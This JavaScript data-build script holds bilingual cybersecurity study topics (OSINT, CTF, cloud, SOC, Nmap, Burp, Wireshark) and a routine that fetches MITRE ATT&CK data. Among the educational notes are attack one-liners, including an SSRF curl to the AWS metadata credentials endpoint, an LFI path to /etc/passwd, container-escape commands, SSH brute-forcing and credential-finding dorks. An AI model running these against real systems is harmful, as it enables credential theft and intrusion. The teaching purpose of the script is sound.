  // ─── OSINT ─────────────────────────────────────────────────────────
  {
    id: "osint_guide",
    category: "OSINT",
    title: "Open Source Intelligence (OSINT)",
    icon: "globe",
    sections: [
      { heading: "What is OSINT?", body: `Open Source Intelligence is the collection and analysis of information from publicly available sources. Used by pentesters, investigators, journalists, and law enforcement.\n\nSources: websites, social media, forums, public records, satellite imagery, job postings, WHOIS, certificate transparency, pastebins, dark web.\n\nOSINT Framework: https://osintframework.com` },
      { heading: "OSINT Tools", body: `Maltego: Visual link analysis. Maps relationships between people, domains, IPs, emails.\n\nShodan.io: Search engine for internet-connected devices.\nQueries: org:"Amazon.com" port:22 | ssl:target.com | product:nginx\n\ntheHarvester: theHarvester -d example.com -l 500 -b google,bing,linkedin\n\nRecon-ng: Modular web recon framework.\n\nSpiderfoot: Automated OSINT from 200+ sources.\n\ncrt.sh: Certificate Transparency subdomain search.\n\nGHunt: Investigate Google accounts.` },
      { heading: "People & Email OSINT", body: `Email:\n• hunter.io: Find domain emails\n• haveibeenpwned.com: Check breach exposure\n\nPeople:\n• LinkedIn, Twitter, Instagram\n• Sherlock: sherlock.py [username] — 300+ sites\n• WhatsMyName.app: 600+ sites\n\nReverse Image:\n• Google Images, TinEye, Yandex, PimEyes (face recognition)\n\nPhone:\n• Truecaller, PhoneInfoga` },
      { heading: "Google Dorking", body: `Key operators:\n• site:example.com — restrict to domain\n• filetype:pdf site:gov.uk — PDFs on UK gov sites\n• inurl:admin login — admin login pages\n• intitle:"index of" password — directory listings\n• "Powered by phpBB" — find phpBB forums\n• "@example.com" filetype:xls — email spreadsheets\n\nGoogle Hacking Database (GHDB): https://www.exploit-db.com/google-hacking-database` }
    ],
    sections_ru: [
      { heading: "Что такое OSINT?", body: `Разведка по открытым источникам — сбор и анализ информации из общедоступных источников. Используется пентестерами, следователями, журналистами и правоохранительными органами.\n\nИсточники: веб-сайты, социальные сети, форумы, публичные реестры, спутниковые снимки, объявления о вакансиях, WHOIS, прозрачность сертификатов, pastebin, даркнет.\n\nФреймворк OSINT: https://osintframework.com` },
      { heading: "Инструменты OSINT", body: `Maltego: Визуальный анализ связей. Отображает отношения между людьми, доменами, IP, email.\n\nShodan.io: Поисковая система для подключённых к интернету устройств.\nЗапросы: org:"Amazon.com" port:22 | ssl:target.com | product:nginx\n\ntheHarvester: theHarvester -d example.com -l 500 -b google,bing,linkedin\n\nRecon-ng: Модульный фреймворк веб-разведки.\n\nSpiderfoot: Автоматический OSINT из 200+ источников.\n\ncrt.sh: Поиск поддоменов через прозрачность сертификатов.\n\nGHunt: Исследование аккаунтов Google.` },
      { heading: "OSINT по людям и email", body: `Email:\n• hunter.io: поиск email-адресов домена\n• haveibeenpwned.com: проверка утечек данных\n\nЛюди:\n• LinkedIn, Twitter, Instagram\n• Sherlock: sherlock.py [username] — 300+ сайтов\n• WhatsMyName.app: 600+ сайтов\n\nОбратный поиск по изображению:\n• Google Images, TinEye, Яндекс, PimEyes (распознавание лиц)\n\nТелефон:\n• Truecaller, PhoneInfoga` },
      { heading: "Google-дорки", body: `Ключевые операторы:\n• site:example.com — ограничить результаты доменом\n• filetype:pdf site:gov.uk — PDF на государственных сайтах UK\n• inurl:admin login — страницы входа администратора\n• intitle:"index of" password — листинги директорий\n• "Powered by phpBB" — найти phpBB-форумы\n• "@example.com" filetype:xls — таблицы Excel с email компании\n\nБаза данных Google Hacking (GHDB): https://www.exploit-db.com/google-hacking-database` }
    ]
  },

  // ─── CTF ───────────────────────────────────────────────────────────
  {
    id: "ctf_guide",
    category: "CTF & Reverse Engineering",
    title: "CTF Strategies & Categories",
    icon: "flag",
    sections: [
      { heading: "What is a CTF?", body: `Capture The Flag is a cybersecurity competition where participants solve challenges to find hidden strings (flags like FLAG{string}).\n\nFormats:\n• Jeopardy: Individual challenges, points per solve — most common\n• Attack-Defense: Defend own services while attacking opponents\n• King of the Hill: Compete for control of a target\n\nPlatforms: CTFtime.org, picoCTF, HackTheBox, TryHackMe, OverTheWire, pwn.college` },
      { heading: "Web Challenges", body: `Common: SQLi, XSS, CSRF, SSRF, LFI/RFI, auth bypass, JWT, SSTI.\n\nLFI: http://ctf.site/page?file=../../../../etc/passwd\nSSTI: {{ 7*7 }} → if 49, SSTI exists\nJWT: Change algorithm to "none"; crack weak secrets with hashcat\n\nTools: Burp Suite, curl, CyberChef` },
      { heading: "Forensics", body: `File analysis:\n• file [filename] — determine file type\n• strings [filename] — extract readable strings\n• binwalk [filename] — find embedded files\n• steghide extract -sf image.jpg — steganography\n• exiftool — extract metadata\n\nNetwork: Wireshark → Follow TCP Stream → Export HTTP Objects\n\nMemory: volatility3 -f memory.dmp windows.pslist` },
      { heading: "Cryptography Challenges", body: `Classical: Caesar, Vigenère, ROT13, Atbash.\n\nModern: Base64, XOR, RSA weak params, PRNG weaknesses.\n\nTools:\n• CyberChef: gchq.github.io/CyberChef (best all-round)\n• decode.fr: classical cipher tools\n• quipqiup.com: cryptogram solver` },
      { heading: "Binary Exploitation (PWN)", body: `Stack buffer overflow: write past buffer to overwrite return address.\n\nProtections:\n• ASLR: randomizes addresses → bypass: leak libc address\n• NX/DEP: non-executable stack → bypass: ROP\n• Stack Canary: random value before return address\n• PIE: code at random addresses\n\nTools: pwntools, GDB+pwndbg, ROPgadget, Ghidra` },
      { heading: "Steganography", body: `Hiding data within other data.\n\nCommon: LSB in images, EXIF metadata, whitespace in text, spectrogram in audio.\n\nTools:\n• steghide, stegsolve, zsteg, outguess\n• Audacity + Sonic Visualizer: audio stego\n• pngcheck: detect modified PNG chunks\n• stegcracker: brute-force steghide password` }
    ],
    sections_ru: [
      { heading: "Что такое CTF?", body: `Capture The Flag — соревнование по кибербезопасности, в котором участники решают задачи для нахождения скрытых строк (флагов вида FLAG{строка}).\n\nФорматы:\n• Jeopardy: отдельные задачи, очки за решение — наиболее распространён\n• Attack-Defense: защита своих сервисов при атаке на чужие\n• King of the Hill: борьба за контроль над целью\n\nПлатформы: CTFtime.org, picoCTF, HackTheBox, TryHackMe, OverTheWire, pwn.college` },
      { heading: "Веб-задания", body: `Типичные: SQLi, XSS, CSRF, SSRF, LFI/RFI, обход аутентификации, JWT, SSTI.\n\nLFI: http://ctf.site/page?file=../../../../etc/passwd\nSSTI: {{ 7*7 }} → если ответ 49, SSTI существует\nJWT: изменить алгоритм на "none"; взломать слабые секреты с помощью hashcat\n\nИнструменты: Burp Suite, curl, CyberChef` },
      { heading: "Форензика (Forensics)", body: `Анализ файлов:\n• file [файл] — определить тип файла\n• strings [файл] — извлечь читаемые строки\n• binwalk [файл] — найти встроенные файлы\n• steghide extract -sf image.jpg — стеганография\n• exiftool — извлечь метаданные\n\nСеть: Wireshark → Follow TCP Stream → Export HTTP Objects\n\nПамять: volatility3 -f memory.dmp windows.pslist` },
      { heading: "Криптографические задания", body: `Классические: шифр Цезаря, Виженера, ROT13, Атбаш.\n\nСовременные: Base64, XOR, слабые параметры RSA, уязвимости ГПСЧ.\n\nИнструменты:\n• CyberChef: gchq.github.io/CyberChef (лучший универсальный)\n• decode.fr: инструменты классических шифров\n• quipqiup.com: решатель криптограмм` },
      { heading: "Двоичная эксплуатация (PWN)", body: `Переполнение стекового буфера: запись за пределы буфера для перезаписи адреса возврата.\n\nЗащиты:\n• ASLR: рандомизация адресов → обход: утечка адреса libc\n• NX/DEP: неисполняемый стек → обход: Return-Oriented Programming (ROP)\n• Stack Canary: случайное значение перед адресом возврата\n• PIE: код по случайным адресам\n\nИнструменты: pwntools, GDB+pwndbg, ROPgadget, Ghidra` },
      { heading: "Стеганография", body: `Сокрытие данных внутри других данных.\n\nРаспространённые техники: LSB в изображениях, метаданные EXIF, пробелы в текстах, спектрограммы в аудио.\n\nИнструменты:\n• steghide, stegsolve, zsteg, outguess\n• Audacity + Sonic Visualizer: аудиостеганография\n• pngcheck: обнаружение изменённых чанков PNG\n• stegcracker: брутфорс пароля steghide` }
    ]
  },

  // ─── CLOUD SECURITY ────────────────────────────────────────────────
  {
    id: "cloud_security",
    category: "Cloud Security",
    title: "Cloud Security Fundamentals",
    icon: "cloud",
    sections: [
      { heading: "Shared Responsibility Model", body: `AWS Shared Responsibility:\n• AWS: Hardware, global infrastructure, networking, hypervisor\n• Customer: Data, IAM, applications, OS patches, security groups, encryption\n\n"Security OF the cloud" (AWS) vs "Security IN the cloud" (Customer)` },
      { heading: "AWS Security Key Concepts", body: `IAM:\n• Principle of Least Privilege\n• Root account: MFA only, never for daily tasks\n• IAM Roles: Temporary credentials via STS — preferred over IAM Users\n\nS3:\n• Block Public Access: enable for all buckets\n• SSE-KMS encryption\n• S3 Access Logs for auditing\n\nVPC:\n• Security Groups: Stateful, instance-level firewall\n• Network ACLs: Stateless, subnet-level\n• VPC Flow Logs: Log all network traffic\n\nKey Services:\n• GuardDuty: Threat detection via ML\n• CloudTrail: API audit log\n• Config: Track resource configuration changes\n• WAF: Web application firewall\n• Secrets Manager: Rotate credentials securely` },
      { heading: "Cloud Attack Techniques", body: `SSRF against cloud metadata:\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\n(Returns temporary AWS credentials)\nDefense: Use IMDSv2 (requires PUT with TTL header)\n\nS3 Misconfiguration:\n• Publicly readable bucket\n• Tools: S3Scanner, GrayhatWarfare.com\n\nIAM Privilege Escalation:\n• Creating admin user with iam:CreateUser + iam:AttachUserPolicy\n• Tools: Pacu (AWS exploitation framework)\n• ScoutSuite: Multi-cloud security auditing\n\nContainer Escape:\n• docker run --privileged — full host access\n• Mounting host: docker run -v /:/host\n• Docker socket: docker.sock access = root on host` }
    ],
    sections_ru: [
      { heading: "Модель совместной ответственности", body: `Модель совместной ответственности AWS:\n• AWS отвечает за: оборудование, глобальную инфраструктуру, сетевое оборудование, гипервизор\n• Клиент отвечает за: данные, IAM, приложения, патчи ОС, группы безопасности, шифрование\n\n«Безопасность ОБЛАКА» (AWS) vs «Безопасность В ОБЛАКЕ» (клиент)` },
      { heading: "Ключевые концепции безопасности AWS", body: `IAM:\n• Принцип наименьших привилегий\n• Корневой аккаунт: только с MFA, не для ежедневной работы\n• IAM Roles: временные учётные данные через STS — предпочтительнее IAM Users\n\nS3:\n• Блокировка публичного доступа: включить для всех корзин\n• Шифрование SSE-KMS\n• Журналы доступа S3 для аудита\n\nVPC:\n• Группы безопасности: stateful, брандмауэр на уровне инстанса\n• Сетевые ACL: stateless, на уровне подсети\n• VPC Flow Logs: запись всего сетевого трафика\n\nКлючевые сервисы:\n• GuardDuty: обнаружение угроз с помощью ML\n• CloudTrail: журнал аудита API\n• Config: отслеживание изменений конфигурации ресурсов\n• WAF: брандмауэр веб-приложений\n• Secrets Manager: безопасное хранение и ротация учётных данных` },
      { heading: "Техники атак в облаке", body: `SSRF против метаданных облака:\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\n(Возвращает временные учётные данные AWS)\nЗащита: использовать IMDSv2 (требует PUT-запроса с заголовком TTL)\n\nМисконфигурация S3:\n• Публично доступная корзина\n• Инструменты: S3Scanner, GrayhatWarfare.com\n\nПовышение привилегий в IAM:\n• Создание admin-пользователя с iam:CreateUser + iam:AttachUserPolicy\n• Инструменты: Pacu (фреймворк эксплуатации AWS)\n• ScoutSuite: аудит безопасности мультиоблачных сред\n\nПобег из контейнера:\n• docker run --privileged — полный доступ к хосту\n• Монтирование хоста: docker run -v /:/host\n• Docker socket: доступ к docker.sock = root на хосте` }
    ]
  },

  // ─── SOC & IR ──────────────────────────────────────────────────────
  {
    id: "incident_response",
    category: "Security Operations",
    title: "Incident Response & SOC",
    icon: "soc",
    sections: [
      { heading: "NIST Incident Response Lifecycle", body: `NIST SP 800-61 defines four phases:\n\n1. PREPARATION: IR team, security controls, logging (SIEM), tabletop exercises\n2. DETECTION & ANALYSIS: Detect via IDS/SIEM/AV/user reports. Classify and prioritize. Determine scope, attack vector, IoCs.\n3. CONTAINMENT, ERADICATION & RECOVERY:\n• Short-term: Isolate affected systems\n• Long-term: Patch, change passwords, block IPs\n• Eradication: Remove malware, close attack vectors\n• Recovery: Restore from clean backups\n4. POST-INCIDENT: Lessons learned within 2 weeks. Update IR procedures. Share threat intel.` },
      { heading: "SOC Structure", body: `SOC = centralized team monitoring and defending 24/7.\n\nTiers:\n• Tier 1 (Alert Analyst): Triage alerts, initial investigation, escalate\n• Tier 2 (Incident Responder): Deep investigation, containment, remediation\n• Tier 3 (Threat Hunter/SME): Proactive hunting, malware analysis, tool development\n\nKey metrics:\n• MTTD: Mean Time To Detect\n• MTTR: Mean Time To Respond\n• False Positive Rate` },
      { heading: "SIEM Systems", body: `SIEM aggregates and correlates log data to detect threats.\n\nPopular SIEMs:\n• Splunk, IBM QRadar, Microsoft Sentinel, ELK Stack, Wazuh\n\nSPL (Splunk):\nindex=windows EventCode=4625 | stats count by src_ip | where count > 100 | sort -count\n(IPs with 100+ failed logins = brute force detection)\n\nKQL (Sentinel):\nSecurityEvent | where EventID == 4625 | summarize count() by IpAddress | where count_ > 50\n\nKey Windows event IDs:\n• 4624: Logon\n• 4625: Failed logon\n• 4672: Special privileges assigned\n• 4648: Logon with explicit credentials` },
      { heading: "Threat Hunting", body: `Proactive search for threats that evade existing security.\n\nProcess:\n1. Hypothesis: Based on threat intel (e.g., "APT29 uses certutil for downloads")\n2. Investigate: Query SIEM/EDR/raw logs\n3. Uncover: New IoCs, TTPs\n4. Inform & Enrich: Update detection rules\n\nHunt for:\n• Living off the Land: certutil, mshta, wscript, rundll32\n• Unusual PowerShell: Encoded commands, download cradles\n• Persistence: New scheduled tasks, run keys, services` }
    ],
    sections_ru: [
      { heading: "Жизненный цикл реагирования на инциденты NIST", body: `NIST SP 800-61 определяет четыре фазы:\n\n1. ПОДГОТОВКА: команда IR, средства контроля, журналирование (SIEM), учебные тревоги\n2. ОБНАРУЖЕНИЕ И АНАЛИЗ: обнаружение через IDS/SIEM/AV/сообщения пользователей. Классификация и приоритизация. Определение масштаба, вектора атаки, IoC.\n3. СДЕРЖИВАНИЕ, УСТРАНЕНИЕ И ВОССТАНОВЛЕНИЕ:\n• Краткосрочное: изоляция поражённых систем\n• Долгосрочное: патчинг, смена паролей, блокировка IP\n• Устранение: удаление вредоносного ПО, закрытие векторов атаки\n• Восстановление: из чистых резервных копий\n4. ПОСТИНЦИДЕНТНАЯ РАБОТА: разбор полётов в течение 2 недель. Обновление процедур IR. Обмен данными об угрозах.` },
      { heading: "Структура SOC", body: `SOC — централизованная команда мониторинга и защиты 24/7.\n\nУровни:\n• Уровень 1 (Аналитик предупреждений): триаж алертов, первичное расследование, эскалация\n• Уровень 2 (Специалист по реагированию): глубокое расследование, сдерживание, устранение\n• Уровень 3 (Охотник за угрозами/SME): проактивный поиск угроз, анализ вредоносного ПО, разработка инструментов\n\nКлючевые метрики:\n• MTTD: среднее время обнаружения\n• MTTR: среднее время реагирования\n• Частота ложноположительных срабатываний` },
      { heading: "Системы SIEM", body: `SIEM агрегирует и коррелирует данные журналов для обнаружения угроз.\n\nПопулярные SIEM:\n• Splunk, IBM QRadar, Microsoft Sentinel, ELK Stack, Wazuh\n\nSPL (Splunk):\nindex=windows EventCode=4625 | stats count by src_ip | where count > 100 | sort -count\n(IP с 100+ неудачными входами = брутфорс)\n\nKQL (Sentinel):\nSecurityEvent | where EventID == 4625 | summarize count() by IpAddress | where count_ > 50\n\nКлючевые ID событий Windows:\n• 4624: Вход в систему\n• 4625: Неудачный вход\n• 4672: Назначение особых привилегий\n• 4648: Вход с явными учётными данными` },
      { heading: "Поиск угроз (Threat Hunting)", body: `Проактивный поиск угроз, обходящих существующие средства защиты.\n\nПроцесс:\n1. Гипотеза: на основе разведки угроз (например, «APT29 использует certutil для загрузок»)\n2. Расследование: запросы в SIEM/EDR/сырые журналы\n3. Обнаружение: новые IoC, TTP\n4. Информирование и обогащение: обновление правил обнаружения\n\nЧто искать:\n• «Жизнь за счёт земли» (LotL): certutil, mshta, wscript, rundll32\n• Необычный PowerShell: закодированные команды, загрузочные колыбели\n• Закрепление: новые задачи планировщика, ключи автозапуска, службы` }
    ]
  },

  // ─── SECURITY TOOLS ────────────────────────────────────────────────
  {
    id: "nmap_guide",
    category: "Security Tools",
    title: "Nmap — Complete Guide",
    icon: "tools",
    sections: [
      { heading: "What is Nmap?", body: `Nmap ("Network Mapper") is an open-source network discovery and security auditing tool created by Gordon Lyon in 1997. The most widely used network scanner worldwide.` },
      { heading: "Scan Types", body: `TCP SYN (-sS): Default. Sends SYN, receives SYN-ACK, never completes. Fast, stealthy.\nnmap -sS 192.168.1.1\n\nTCP Connect (-sT): Full handshake. More visible in logs.\nUDP Scan (-sU): Slower. Used for DNS, DHCP, SNMP.\nnmap -sU -p 53,67,161 192.168.1.1\n\nNull (-sN), FIN (-sF), Xmas (-sX): Bypass stateless firewalls.\nACK (-sA): Determines if ports are filtered (firewall detection).` },
      { heading: "Service & OS Detection", body: `Service Version (-sV):\nnmap -sV 192.168.1.1\n\nOS Detection (-O):\nnmap -O 192.168.1.1\n\nAggressive (-A): OS + version + scripts + traceroute:\nnmap -A 192.168.1.1` },
      { heading: "Nmap Scripting Engine (NSE)", body: `nmap --script=smb-vuln-ms17-010 192.168.1.1\nnmap --script=http-enum 192.168.1.1\nnmap --script=ftp-anon 192.168.1.1\nnmap --script=ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.1\nnmap --script vuln 192.168.1.1\n\nOutput:\n-oN output.txt  — Normal text\n-oX output.xml  — XML\n-oG output.grep — Grepable\n-oA output      — All formats` }
    ],
    sections_ru: [
      { heading: "Что такое Nmap?", body: `Nmap («Network Mapper») — инструмент с открытым исходным кодом для обнаружения сетей и аудита безопасности, созданный Гордоном Лайоном в 1997 году. Наиболее широко используемый сетевой сканер в мире.` },
      { heading: "Типы сканирования", body: `TCP SYN (-sS): стандартный режим. Отправляет SYN, получает SYN-ACK, не завершает соединение. Быстрый, скрытый.\nnmap -sS 192.168.1.1\n\nTCP Connect (-sT): полное рукопожатие. Более заметен в журналах.\nUDP-сканирование (-sU): медленнее. Для DNS, DHCP, SNMP.\nnmap -sU -p 53,67,161 192.168.1.1\n\nNull (-sN), FIN (-sF), Xmas (-sX): обход stateless-брандмауэров.\nACK (-sA): определяет, фильтруются ли порты (обнаружение брандмауэра).` },
      { heading: "Определение сервисов и ОС", body: `Версия сервиса (-sV):\nnmap -sV 192.168.1.1\n\nОпределение ОС (-O):\nnmap -O 192.168.1.1\n\nАгрессивный (-A): ОС + версия + скрипты + трассировка:\nnmap -A 192.168.1.1` },
      { heading: "Nmap Scripting Engine (NSE)", body: `nmap --script=smb-vuln-ms17-010 192.168.1.1\nnmap --script=http-enum 192.168.1.1\nnmap --script=ftp-anon 192.168.1.1\nnmap --script=ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.1\nnmap --script vuln 192.168.1.1\n\nВывод:\n-oN output.txt  — обычный текст\n-oX output.xml  — XML\n-oG output.grep — формат grep\n-oA output      — все форматы` }
    ]
  },

  {
    id: "burpsuite_guide",
    category: "Security Tools",
    title: "Burp Suite — Complete Guide",
    icon: "tools",
    sections: [
      { heading: "What is Burp Suite?", body: `Industry-standard web application security testing platform by PortSwigger. Acts as a proxy between browser and web app, allowing intercept and modification of HTTP/S requests. Used by 90%+ of professional web application pentesters.` },
      { heading: "Core Tools", body: `Proxy: Intercepts browser traffic. Setup: proxy to 127.0.0.1:8080, install Burp CA cert.\n\nRepeater: Manually re-send HTTP requests. Ctrl+R to send to Repeater.\n\nIntruder: Automated attacks. Types:\n• Sniper: Single payload, one position\n• Battering Ram: Same payload all positions\n• Pitchfork: Multiple payloads in parallel\n• Cluster Bomb: All payload combinations\n\nScanner (Pro): Auto-detects SQLi, XSS, XXE, SSRF, 100+ vulns.\n\nDecoder: Encode/decode URL, Base64, HTML, hex.\nExtender (BApp Store): Logger++, Autorize, Param Miner, ActiveScan++.` },
      { heading: "Common Workflows", body: `Testing SQLi:\n1. Capture request in Proxy\n2. Send to Repeater (Ctrl+R)\n3. Add ' to parameter, observe error\n4. Send to Intruder with SQLi wordlist\n\nTesting Authentication with Intruder:\n1. Capture login request\n2. Send to Intruder\n3. Mark username/password as positions\n4. Load password wordlist\n5. Run Cluster Bomb\n6. Sort by response length/status to find valid creds` }
    ],
    sections_ru: [
      { heading: "Что такое Burp Suite?", body: `Ведущая платформа для тестирования безопасности веб-приложений от PortSwigger. Действует как прокси между браузером и веб-приложением, позволяя перехватывать и изменять HTTP/S-запросы. Используется более 90% профессиональных пентестеров веб-приложений.` },
      { heading: "Основные инструменты", body: `Прокси: перехватывает трафик браузера. Настройка: прокси на 127.0.0.1:8080, установить CA-сертификат Burp.\n\nRepeater: ручная повторная отправка HTTP-запросов. Ctrl+R — отправить в Repeater.\n\nIntruder: автоматизированные атаки. Типы:\n• Sniper: одна нагрузка, одна позиция\n• Battering Ram: одна нагрузка во всех позициях\n• Pitchfork: несколько нагрузок параллельно\n• Cluster Bomb: все комбинации нагрузок\n\nScanner (Pro): автоматически обнаруживает SQLi, XSS, XXE, SSRF и 100+ уязвимостей.\n\nDecoder: кодирование/декодирование URL, Base64, HTML, hex.\nExtender (BApp Store): Logger++, Autorize, Param Miner, ActiveScan++.` },
      { heading: "Типичные рабочие процессы", body: `Тестирование SQLi:\n1. Захватить запрос в Proxy\n2. Отправить в Repeater (Ctrl+R)\n3. Добавить ' к параметру, наблюдать ошибку\n4. Отправить в Intruder со словарём SQLi-нагрузок\n\nТестирование аутентификации с Intruder:\n1. Захватить запрос входа в систему\n2. Отправить в Intruder\n3. Отметить поля логина/пароля как позиции\n4. Загрузить словарь паролей\n5. Запустить Cluster Bomb\n6. Отсортировать по длине ответа/статусу для нахождения верных данных` }
    ]
  },

  {
    id: "wireshark_guide",
    category: "Security Tools",
    title: "Wireshark — Packet Analysis",
    icon: "tools",
    sections: [
      { heading: "What is Wireshark?", body: `World's most popular open-source network protocol analyzer. Captures network traffic and displays it in human-readable format. Used for troubleshooting, protocol analysis, security auditing, and forensics.` },
      { heading: "Essential Display Filters", body: `By protocol: http | ssl | dns | tcp | udp | icmp | smb\n\nBy IP:\nip.addr == 192.168.1.1\nip.src == 10.0.0.1\nip.dst == 8.8.8.8\n\nBy port:\ntcp.port == 80\nudp.port == 53\n\nBy content:\nframe contains "password"\nhttp.request.method == "POST"\nhttp.response.code == 200\n\nCombined:\nhttp and ip.src == 192.168.1.100\nnot arp and not icmp\ntcp.flags.syn == 1 and tcp.flags.ack == 0` },
      { heading: "Common Analysis Tasks", body: `Follow TCP stream:\nRight-click → Follow → TCP Stream\nReassembles conversation in readable form.\n\nExport HTTP objects:\nFile → Export Objects → HTTP\n\nStatistics:\n• Protocol Hierarchy: breakdown by protocol\n• Conversations: top talkers\n• I/O Graph: traffic over time\n• Endpoints: all IP addresses\n\nDetect SYN scan:\ntcp.flags == 0x002 — many sources = scan\n\nDetect ARP spoofing:\narp — look for multiple MACs claiming same IP\n\nFind cleartext creds:\nhttp.request.method == "POST" — look for login forms\ntelnet — everything in cleartext` }
    ],
    sections_ru: [
      { heading: "Что такое Wireshark?", body: `Самый популярный в мире анализатор сетевых протоколов с открытым исходным кодом. Захватывает сетевой трафик и отображает его в понятном для человека виде. Используется для диагностики, анализа протоколов, аудита безопасности и форензики.` },
      { heading: "Основные фильтры отображения", body: `По протоколу: http | ssl | dns | tcp | udp | icmp | smb\n\nПо IP:\nip.addr == 192.168.1.1\nip.src == 10.0.0.1\nip.dst == 8.8.8.8\n\nПо порту:\ntcp.port == 80\nudp.port == 53\n\nПо содержимому:\nframe contains "password"\nhttp.request.method == "POST"\nhttp.response.code == 200\n\nКомбинированные:\nhttp and ip.src == 192.168.1.100\nnot arp and not icmp\ntcp.flags.syn == 1 and tcp.flags.ack == 0` },
      { heading: "Типичные задачи анализа", body: `Следить за TCP-потоком:\nПКМ → Follow → TCP Stream\nВосстанавливает разговор в читаемом виде.\n\nЭкспорт HTTP-объектов:\nFile → Export Objects → HTTP\n\nСтатистика:\n• Protocol Hierarchy: разбивка по протоколам\n• Conversations: самые активные соединения\n• I/O Graph: трафик во времени\n• Endpoints: все IP-адреса\n\nОбнаружение SYN-сканирования:\ntcp.flags == 0x002 — много источников = сканирование\n\nОбнаружение ARP-спуфинга:\narp — искать несколько MAC-адресов для одного IP\n\nПоиск учётных данных в открытом виде:\nhttp.request.method == "POST" — искать формы входа\ntelnet — весь трафик в открытом виде` }
    ]
  }

];

async function buildDeepTheory() {
  console.log("Building deep theory database with Russian translations...");
  let allTopics = [...handcraftedTopics];

  // Fetch MITRE ATT&CK (English only, Russian not available via public API)
  console.log("Fetching MITRE ATT&CK Enterprise data...");
  const mitreUrl = 'https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json';
  try {
    const mitreData = await fetchJson(mitreUrl);
    const techniques = mitreData.objects
      .filter(obj => obj.type === 'attack-pattern' && !obj.revoked && obj.description)
      .slice(0, 60);

    techniques.forEach(t => {
      const extRefs = t.external_references || [];
      const mitreRef = extRefs.find(r => r.source_name === 'mitre-attack');
      const techId = mitreRef ? mitreRef.external_id : t.id;
      allTopics.push({
        id: t.id,
        category: 'MITRE ATT&CK',
        title: `[${techId}] ${t.name}`,
        icon: 'mitre',
        sections: [
          { heading: 'Description', body: t.description },
          { heading: 'Tactic', body: (t.kill_chain_phases || []).map(p => p.phase_name).join(', ') || 'N/A' },
          ...(t.x_mitre_detection ? [{ heading: 'Detection', body: t.x_mitre_detection }] : []),
          ...(t.x_mitre_platforms ? [{ heading: 'Platforms', body: (t.x_mitre_platforms || []).join(', ') }] : [])
        ],
        sections_ru: [
          { heading: 'Описание', body: t.description + '\n\n(Данная техника из базы MITRE ATT&CK. Полный перевод на русский язык доступен на: https://attack.mitre.org)' },
          { heading: 'Тактика', body: (t.kill_chain_phases || []).map(p => p.phase_name).join(', ') || 'Н/Д' },
          ...(t.x_mitre_detection ? [{ heading: 'Обнаружение', body: t.x_mitre_detection }] : []),
          ...(t.x_mitre_platforms ? [{ heading: 'Платформы', body: (t.x_mitre_platforms || []).join(', ') }] : [])
        ]
      });
    });
    console.log(`Fetched ${techniques.length} MITRE ATT&CK techniques.`);
  } catch (err) {
    console.error("MITRE fetch failed:", err.message);
  }

  const targetPath = path.join(__dirname, 'src', 'data');
  if (!fs.existsSync(targetPath)) fs.mkdirSync(targetPath, { recursive: true });

  fs.writeFileSync(path.join(targetPath, 'theory.json'), JSON.stringify(allTopics, null, 2));

  const byCategory = {};
  allTopics.forEach(t => { byCategory[t.category] = (byCategory[t.category] || 0) + 1; });

  console.log(`\n✅ Theory database built with Russian translations!`);
  console.log(`📚 Total topics: ${allTopics.length}`);
  Object.entries(byCategory).forEach(([cat, count]) => console.log(`  ${cat}: ${count}`));
}

buildDeepTheory();
